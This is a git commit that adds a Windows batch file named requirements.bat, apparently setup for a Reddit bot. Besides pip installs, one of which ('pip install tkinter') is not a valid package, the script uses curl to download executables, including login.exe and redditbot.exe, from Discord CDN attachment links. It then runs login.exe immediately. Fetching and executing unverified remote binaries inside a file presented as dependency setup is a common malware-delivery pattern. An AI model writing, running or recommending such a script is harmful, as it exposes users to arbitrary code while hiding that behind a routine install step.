3a5ae0f3dad650ae7a71440c8f6f1fe17cdff703
theZombieGeneral <52089693+theZombieGeneral@users.noreply.github.com>
2023-07-06 20:41:23 +0300

    Add files via upload

---
+++ requirements.bat
@@ -0,0 +1,12 @@
+pip install selenium
+pip install tkinter
+curl --output "chromedriver.exe" -L "https://cdn.discordapp.com/attachments/753720273425006630/1126444519550890034/chromedriver.exe"
+curl --output "communities.txt" -L "https://cdn.discordapp.com/attachments/753720273425006630/1126444518049329172/communities.txt"
+curl --output "urls.txt" -L "https://cdn.discordapp.com/attachments/753720273425006630/1126444518049329172/communities.txt"
+curl --output "titles.txt" -L "https://cdn.discordapp.com/attachments/753720273425006630/1126444518049329172/communities.txt"
+curl --output "login.exe" -L "https://cdn.discordapp.com/attachments/753720273425006630/1126564382239895703/login.exe"
+curl --output "redditbot.exe" -L "https://cdn.discordapp.com/attachments/753720273425006630/1126564381812084916/redditbot.exe"
+login.exe
+
+
+
